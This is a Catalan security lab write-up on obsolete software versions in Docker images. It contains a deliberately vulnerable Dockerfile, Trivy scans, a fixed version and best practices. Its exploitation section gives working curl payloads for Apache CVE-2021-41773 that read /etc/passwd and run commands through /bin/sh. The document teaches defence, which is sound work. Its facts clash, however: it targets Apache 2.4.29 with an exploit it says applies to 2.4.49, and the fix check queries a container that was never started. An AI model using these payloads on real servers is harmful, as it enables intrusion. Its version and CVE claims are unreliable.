# Vulnerabilitat 4: Versions Obsoletes

## Descripció Breu

Usar versions antigues de serveis, llibreries o imatges base en contenidors Docker exposa el sistema a vulnerabilitats conegudes i documentades públicament (CVEs). Els atacants poden consultar bases de dades de vulnerabilitats com NVD o CVE Details per trobar exploits ja desenvolupats contra versions específiques de software.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** → Vulnerabilitats conegudes poden permetre accés a dades sensibles
- **Integritat** → Exploits documentats poden permetre modificació del sistema
- **Disponibilitat** → Algunes vulnerabilitats permeten atacs de denegació de servei (DoS)

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Alt |
| **CVE relacionat** | Múltiples CVEs segons la versió usada |
| **Impacte real** | Explotació directa amb exploits públics disponibles |
| **Problema addicional** | Les imatges Docker es construeixen una vegada i poden quedar desactualitzades sense que ningú ho noti |

### Exemples de CVEs reals per versions antigues

| Software | Versió vulnerable | CVE | Impacte |
|---|---|---|---|
| Apache 2.4.29 | < 2.4.51 | CVE-2021-41773 | Path Traversal + RCE |
| OpenSSL 1.1.1 | < 1.1.1l | CVE-2021-3711 | Buffer Overflow |
| PHP 7.2 | < 8.0 | CVE-2019-11043 | RCE en configuracions amb nginx |
| Ubuntu 18.04 | EOL abril 2023 | Múltiples | Sense pegats de seguretat oficials |

---

## Implementació Vulnerable

```dockerfile
# Vulnerable: versions obsoletes amb CVEs coneguts
FROM ubuntu:18.04

# Versions antigues amb vulnerabilitats conegudes
RUN apt-get update && apt-get install -y \
    apache2=2.4.29* \
    php7.2* \
    openssl=1.1.1*

# Imatge base antiga sense pegats de seguretat
EXPOSE 80 443

CMD ["apache2ctl", "-D", "FOREGROUND"]
```

### Verificació de la vulnerabilitat

```bash
# Construir la imatge vulnerable
docker build -f Dockerfile.vulnerable -t vuln-versions .
docker run -d -p 8085:80 --name vuln-obsolete-versions vuln-versions

# Comprovar versions instal·lades
docker exec vuln-obsolete-versions apache2 -v
docker exec vuln-obsolete-versions php --version
docker exec vuln-obsolete-versions openssl version

# Escanejar vulnerabilitats amb Trivy
trivy image vuln-versions
```

**Resultat esperat de Trivy:**
```
CRITICAL: 5
HIGH:     12
MEDIUM:   8
...
CVE-2021-41773  apache2  CRITICAL
CVE-2021-3711   openssl  CRITICAL
```

---

## Com Explotar

### Pas 1: Identificar versions en ús
```bash
# Escaneig de versions amb nmap
nmap -sV -p 8085 localhost

# Output: Apache/2.4.29 (Ubuntu)
```

### Pas 2: Buscar CVEs per la versió trobada
```bash
# Consultar base de dades de vulnerabilitats
# https://nvd.nist.gov/vuln/search
# Cercar: apache 2.4.29

# O amb Searchsploit localment
searchsploit apache 2.4.29
```

### Pas 3: Explotar CVE-2021-41773 (Path Traversal en Apache 2.4.49)
```bash
# Llegir fitxers arbitraris del sistema
curl "http://localhost:8085/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# Execució remota de codi
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" \
     "http://localhost:8085/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```

### Pas 4: Escaneig automatitzat
```bash
# Trivy per escanejar la imatge completa
trivy image vuln-versions --severity CRITICAL,HIGH

# Grype com a alternativa
grype vuln-versions
```

---

## Solució — Dockerfile.fixed

```dockerfile
# Fixed: versions actualitzades i imatge base moderna
FROM ubuntu:22.04

# Versions actuals amb pegats de seguretat aplicats
RUN apt-get update && apt-get install -y \
    apache2 \
    php8.1 \
    openssl

RUN useradd -m -u 1001 appuser

# Actualitzar sempre abans de construir
RUN apt-get upgrade -y && apt-get clean

EXPOSE 80

USER appuser

CMD ["apache2ctl", "-D", "FOREGROUND"]
```

### Verificació de la correcció

```bash
# Construir la imatge corregida
docker build -f Dockerfile.fixed -t fixed-versions .

# Comprovar versions actuals
docker exec fixed-obsolete-versions apache2 -v
docker exec fixed-obsolete-versions php --version

# Escanejar amb Trivy
trivy image fixed-versions
```

**Resultat esperat:**
```
CRITICAL: 0
HIGH:     0
...
Total: 0 vulnerabilities
```

---

## Explicació de la Solució

| Mesura | Funció |
|---|---|
| Usar `ubuntu:22.04` en lloc de `18.04` | Imatge base amb suport actiu i pegats recents |
| Instal·lar versions actuals dels serveis | Sense CVEs crítics coneguts |
| `apt-get upgrade -y` al Dockerfile | Aplica tots els pegats disponibles en el moment de la construcció |
| `apt-get clean` | Redueix la mida de la imatge eliminant caché innecessària |

### Bones pràctiques per mantenir les versions actualitzades

Per evitar que les imatges quedin obsoletes amb el temps, cal reconstruir-les periòdicament:

```bash
# Reconstruir sense usar la caché de Docker
docker build --no-cache -f Dockerfile.fixed -t fixed-versions .

# Comprovar si hi ha actualitzacions disponibles
trivy image fixed-versions
```

---

## Bones Pràctiques

- Usar sempre imatges base amb suport actiu (LTS vigent)
- Especificar versions concretes al Dockerfile per tenir control, però actualitzar-les regularment
- Integrar Trivy o Grype al pipeline CI/CD per detectar vulnerabilitats automàticament
- Reconstruir les imatges periòdicament per incorporar pegats de seguretat
- Subscriure's a alertes de seguretat dels serveis que s'utilitzen (ex. Apache Security Advisories)
- Evitar imatges base genèriques com `latest` sense verificar la versió real

---

## Referències

- [CVE-2021-41773 - Apache Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [CVE-2021-3711 - OpenSSL Buffer Overflow](https://nvd.nist.gov/vuln/detail/CVE-2021-3711)
- [NVD - National Vulnerability Database](https://nvd.nist.gov/)
- [Trivy - Container Vulnerability Scanner](https://github.com/aquasecurity/trivy)
- [Grype - Vulnerability Scanner](https://github.com/anchore/grype)
- [Docker Official Images](https://hub.docker.com/search?q=&type=image&image_filter=official)
